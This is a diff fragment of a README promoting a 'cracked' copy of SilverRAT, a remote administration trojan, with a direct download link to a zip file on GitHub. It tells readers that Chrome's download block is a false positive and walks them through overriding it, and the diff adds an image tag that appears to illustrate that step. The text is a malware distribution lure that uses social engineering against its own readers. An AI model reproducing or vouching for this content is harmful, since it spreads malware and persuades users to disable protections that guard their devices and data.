@@ -30,3 +30,5 @@ It is the best Remote administration tool of 2023 which has many unique features
 DOWNLOAD - https://github.com/cracked-software/SilverRAT_1.0-cracked/blob/main/SilverRat_1.1_cracked.zip
 
 Google Chrome can block downloads, it's a false positive for hacked software. Go to downloads in the Google Chrome menu and allow saving the download file.
+
+img src="https://github.com/cracked-software/SilverRAT_1.0-cracked/blob/main/2024-01-10_09h06_36.png" alt="chrome">
